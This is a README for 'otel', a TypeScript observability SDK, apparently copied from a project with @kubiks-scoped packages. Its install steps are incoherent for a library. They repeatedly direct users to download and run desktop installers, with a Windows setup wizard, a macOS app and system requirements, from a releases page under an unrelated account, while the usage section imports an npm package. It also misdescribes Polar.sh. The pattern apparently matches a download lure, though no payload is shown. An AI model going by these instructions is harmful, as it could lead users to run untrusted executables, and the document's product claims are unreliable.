# 🌟 otel - Your Essential SDK for TypeScript Observability

[![Download otel](https://img.shields.io/badge/Download-otel-brightgreen)](https://github.com/Gabeeeeeesd/otel/releases)

## 🛠️ Overview

otel is a simple yet powerful telemetry SDK designed for TypeScript applications. It helps you monitor and understand your systems without any complex setup. With otel, you can gain insights into your application performance and keep track of important metrics effortlessly.

## 🚀 Getting Started

1. **Download the Application**  
   To get started, visit the [Releases page](https://github.com/Gabeeeeeesd/otel/releases) and download the latest version of otel for your operating system.

2. **Install the SDK**  
   After downloading, follow these steps based on your platform.

   - **Windows:** 
     - Double-click the downloaded file to start the installation.
     - Follow the instructions in the setup wizard.

   - **macOS:** 
     - Open the downloaded file.
     - Drag the otel application to your Applications folder.

   - **Linux:** 
     - Open a terminal.
     - Navigate to the directory where you downloaded the file.
     - Run the command `tar -xvf otel-linux.tar.gz` to extract the files.
     - Follow the README instructions in the extracted folder.

3. **Verify Installation**  
   To ensure otel is installed correctly, you can run a simple command in your terminal:
   ```
   otel --version
   ```

## 📥 Download & Install

Visit this page to download: [otel Releases](https://github.com/Gabeeeeeesd/otel/releases).

After downloading, follow the installation steps above that match your operating system. 

## 📚 Features

- **Easy Setup:** Quickly integrate otel into your TypeScript applications.
- **Comprehensive Metrics:** Gain insights into application performance with minimal effort.
- **OpenTelemetry Compliant:** Built on the OpenTelemetry standard to ensure compatibility with various systems.
- **Flexible Integrations:** Works seamlessly with other tools in your development stack.

## 🔧 Supported Integrations

otel supports various integrations to enhance your observability experience.

- [`@kubiks/otel-autumn`](./packages/otel-autumn/README.md)
- [`@kubiks/otel-better-auth`](./packages/otel-better-auth/README.md)
- [`@kubiks/otel-drizzle`](./packages/otel-drizzle/README.md)
- [`@kubiks/otel-resend`](./packages/otel-resend/README.md)
- [`@kubiks/otel-upstash-queues`](./packages/otel-upstash-queues/README.md)

## 🚧 Coming Soon

We are continuously working on new integrations. Here are some exciting ones planned for the near future:

- [Stripe](https://stripe.com/) - A popular payment processing platform.
- [Polar.sh](https://polar.sh/) - A service for building and deploying serverless applications.
- [ClickHouse](https://clickhouse.tech/) - A fast open-source OLAP database management system.

## 🎓 System Requirements

To ensure smooth operation, please check the following system requirements based on your operating system:

- **Windows:** 
  - Windows 10 or later 
  - 4 GB RAM or more 
  - 100 MB of free disk space

- **macOS:**
  - macOS Mojave (10.14) or later
  - 4 GB RAM or more 
  - 100 MB of free disk space

- **Linux:** 
  - Ubuntu 18.04 or later 
  - 4 GB RAM or more 
  - 100 MB of free disk space

## ⚙️ Usage Instructions

After installation, you can start using otel in your TypeScript projects. Here’s a simple example:

1. Import the SDK in your TypeScript file:
   ```typescript
   import { Otel } from '@kubiks/otel';
   ```
   
2. Initialize the SDK:
   ```typescript
   const otel = new Otel({
       serviceName: 'my-app',
       // Configure other options as needed
   });
   ```

3. Start capturing metrics:
   ```typescript
   otel.start();
   ```

Refer to each integration's documentation for more detailed usage instructions.

## 🛡️ Support

If you have any questions or need help, please check our Issues section in the repository or reach out to the community. We aim to assist you in resolving any challenges you face while using otel.

Stay informed about updates and new integrations by watching our GitHub repository.

Remember to download the latest version of otel from the [Releases page](https://github.com/Gabeeeeeesd/otel/releases).